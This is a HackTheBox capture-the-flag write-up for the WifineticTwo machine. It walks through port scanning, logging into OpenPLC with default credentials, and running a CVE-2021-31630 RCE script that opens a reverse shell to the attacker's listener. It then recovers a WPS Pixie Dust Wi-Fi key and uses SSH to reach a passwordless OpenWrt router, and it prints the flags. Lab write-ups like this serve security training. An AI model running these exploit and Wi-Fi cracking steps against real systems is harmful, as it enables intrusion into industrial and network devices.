---
title: HackTheBox - WifineticTwo
date: Fri Aug 16 12:44:30 AM EDT 2024
categories: [PentestNotes]
tags: [linux,xss,rce,wifi,plc,htb]
---

## Recon

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.7:22
Open 10.10.11.7:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.7
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-18 05:54 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:54
Completed Parallel DNS resolution of 1 host. at 05:54, 0.11s elapsed
DNS resolution of 1 IPs took 0.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:54
Scanning 10.10.11.7 [2 ports]
Discovered open port 8080/tcp on 10.10.11.7
Discovered open port 22/tcp on 10.10.11.7
Completed Connect Scan at 05:54, 0.16s elapsed (2 total ports)
Initiating Service scan at 05:54
Scanning 2 services on 10.10.11.7
Completed Service scan at 05:54, 21.03s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.7.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 4.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Nmap scan report for 10.10.11.7
Host is up, received user-set (0.087s latency).
Scanned at 2024-05-18 05:54:20 UTC for 27s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack Werkzeug/1.0.1 Python/2.7.18
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZkhCkw.Crhss6ofbKN4Kmrkc5uUsWzJT1U; Expires=Sat, 18-May-2024 05:59:27 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sat, 18 May 2024 05:54:27 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZkhCkg.VoR14agonL6rhs1MvwbuRViI7CU; Expires=Sat, 18-May-2024 05:59:26 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sat, 18 May 2024 05:54:26 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZkhCkw.Crhss6ofbKN4Kmrkc5uUsWzJT1U; Expires=Sat, 18-May-2024 05:59:27 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sat, 18 May 2024 05:54:27 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=5/18%Time=66484293%P=x86_64-alpine-linux-musl
SF:%r(GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/h
SF:tml;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://
SF:0\.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJf
SF:ZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZkhCkg\.VoR14agonL6rhs1Mvwb
SF:uRViI7CU;\x20Expires=Sat,\x2018-May-2024\x2005:59:26\x20GMT;\x20HttpOnl
SF:y;\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:
SF:\x20Sat,\x2018\x20May\x202024\x2005:54:26\x20GMT\r\n\r\n<!DOCTYPE\x20HT
SF:ML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>R
SF:edirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\
SF:x20be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20h
SF:ref=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\."
SF:)%r(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20
SF:Cookie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZkhCkw\.Cr
SF:hss6ofbKN4Kmrkc5uUsWzJT1U;\x20Expires=Sat,\x2018-May-2024\x2005:59:27\x
SF:20GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Wer
SF:kzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sat,\x2018\x20May\x202024\
SF:x2005:54:27\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\
SF:x20request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\nco
SF:ntent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1
SF:>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x
SF:20request\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x204
SF:04\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\nc
SF:ontent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJf
SF:cGVybWFuZW50Ijp0cnVlfQ\.ZkhCkw\.Crhss6ofbKN4Kmrkc5uUsWzJT1U;\x20Expires
SF:=Sat,\x2018-May-2024\x2005:59:27\x20GMT;\x20HttpOnly;\x20Path=/\r\nserv
SF:er:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sat,\x2018\x20Ma
SF:y\x202024\x2005:54:27\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-/
SF:/W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</
SF:title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not
SF:\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20UR
SF:L\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20a
SF:gain\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:54
Completed NSE at 05:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.04 seconds
```
</details>

{::options parse_block_html="false" /}

## HTTP (8080)

### OpenPLC

![Writeup.png](/assets/images/Machines/WifineticTwo/Writeup.png)

We have no users so we can't exactly go somewhere.. Using [default credentials](https://www.illinois.adsc.com.sg/OpenPLC61850/getstarted.html#:~:text=The%20default%20username%20and%20password,is%20openplc%20and%20openplc%2C%20respectively.): `openplc:openplc` we are able to login!

> OpenPLC creds: `openplc:openplc`
{: .prompt-tip }

### Authenticated RCE

[CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630)
[OpenPLC WebServer v3 - Authenticated RCE](https://github.com/thewhiteh4t/cve-2021-31630)

```bash
└─$ py cve_2021_31630.py -u openplc -p openplc http://10.10.11.7:8080/ -lh 10.10.14.37 -lp 4444

------------------------------------------------
--- CVE-2021-31630 -----------------------------
--- OpenPLC WebServer v3 - Authenticated RCE ---
------------------------------------------------

[>] Found By : Fellipe Oliveira
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]

[>] Target   : http://10.10.11.7:8080
[>] Username : openplc
[>] Password : openplc
[>] Timeout  : 20 secs
[>] LHOST    : 10.10.14.37
[>] LPORT    : 4444

[!] Checking status...
[+] Service is Online!
[!] Logging in...
[+] Logged in!
[!] Restoring default program...
[+] PLC Stopped!
[+] Cleanup successful!
[!] Uploading payload...
[+] Payload uploaded!
[+] Waiting for 5 seconds...
[+] Compilation successful!
[!] Starting PLC...
[+] PLC Started! Check listener...
[!] Cleaning up...
[+] PLC Stopped!
[+] Cleanup successful!
```

## Reverse Shell

We are root, which is odd... something isn't right.

```bash
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Connection from 10.10.11.7:38966.
root@attica03:/opt/PLC/OpenPLC_v3/webserver# whoami
root
root@attica03:/opt/PLC/OpenPLC_v3/webserver# id
uid=0(root) gid=0(root) groups=0(root)
```

### User.txt

`root` user contains `user.txt` meaning this `root` user is not the one we need.

```bash
root@attica03:~# cat user.txt
6e1ccfe76f3fdb33d106b3640c211f4b
```

## Privilege Escalation

Just like the box name suggests we are dealing with a WiFi. Check network interfaces:

```bash
root@attica03:~# ip -c address show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0@if20: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:79:d1:d2 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.4/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.3.237/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
       valid_lft 3249sec preferred_lft 3249sec
    inet6 fe80::216:3eff:fe79:d1d2/64 scope link
       valid_lft forever preferred_lft forever
7: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
root@attica03:~# iwconfig
eth0      no wireless extensions.
lo        no wireless extensions.
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

We have Wi-Fi related command to utilize, such as [iw](https://linux.die.net/man/8/iw) - _show / manipulate wireless devices and their configuration_

```bash
root@attica03:~# iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
        last seen: 9207.708s [boottime]
        TSF: 1722101672346840 usec (19931d, 17:34:32)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * SSID List
                 * Operating Mode Notification
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                 * Manufacturer:
                 * Model:
                 * Model Number:
                 * Serial Number:
                 * Primary Device Type: 0-00000000-0
                 * Device name:
                 * Config methods: Label, Display, Keypad
                 * Version2: 2.0
```

WPS is supported meaning it could be bruteforced.

### Pixie Dust Attack

_**[OneShot](https://github.com/kimocoder/OneShot)** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode._

```bash
root@attica03:/dev/shm# python3 oneshot.py -i wlan0
[*] Running wpa_supplicant…
[*] BSSID not specified (--bssid) — scanning for available networks
Networks list:
#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
1)   02:00:00:00:01:00  plcrouter                 WPA2     -30
Select target (press Enter to refresh): 1 # <-- Input
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[*] Sending WPS Message M2…
[*] Received WPS Message M3
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
```

> **Note**: Python version of attack is used as it's much simpler then compiling C
{: .prompt-info }

## Connect to `plcrouter`

Generate config file for connection and then use generated config to connect to router.
```bash
root@attica03:/dev/shm# wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' | tee plcrouter.conf
network={
        ssid="plcrouter"
        #psk="NoWWEDoKnowWhaTisReal123!"
        psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
}
root@attica03:/dev/shm# wpa_supplicant -B -c plcrouter.conf -i wlan0
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
root@attica01:/dev/shm# ip -brief a s               
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if18        UP             10.0.3.2/24 10.0.3.52/24 metric 100 fe80::216:3eff:fefc:910c/64
wlan0            UP             fe80::ff:fe00:200/64
root@attica01:/dev/shm# dhclient -v 
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan0/02:00:00:00:02:00
Sending on   LPF/wlan0/02:00:00:00:02:00
Listening on LPF/eth0/00:16:3e:fc:91:0c
Sending on   LPF/eth0/00:16:3e:fc:91:0c
Sending on   Socket/fallback
DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 3 (xid=0x725d3820)
DHCPDISCOVER on eth0 to 255.255.255.255 port 67 interval 3 (xid=0x1aeee019)
DHCPOFFER of 10.0.3.52 from 10.0.3.1
DHCPREQUEST for 10.0.3.52 on eth0 to 255.255.255.255 port 67 (xid=0x19e0ee1a)
DHCPACK of 10.0.3.52 from 10.0.3.1 (xid=0x1aeee019)
RTNETLINK answers: File exists
bound to 10.0.3.52 -- renewal in 1611 seconds.
root@attica01:/dev/shm# ip -brief a s     
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if18        UP             10.0.3.2/24 10.0.3.52/24 metric 100 fe80::216:3eff:fefc:910c/64
wlan0            UP             192.168.1.84/24 fe80::ff:fe00:200/64
root@attica01:/dev/shm# arp
Address                  HWtype  HWaddress           Flags Mask            Iface
attica01                         (incomplete)                              eth0
192.168.1.1              ether   02:00:00:00:01:00   C                     wlan0
10.0.3.1                 ether   00:16:3e:00:00:00   C                     eth0
```

Use `dhclient` to get an IP and using `arp` check network ip.

```bash
root@attica01:/dev/shm# ssh root@192.168.1.1
ssh root@192.168.1.1

BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# ls
root.txt  shell

```
### Root.txt

```
root@ap:~# cat root.txt
a086fa5a9ebffe09a83f4fd434d3fb2b
```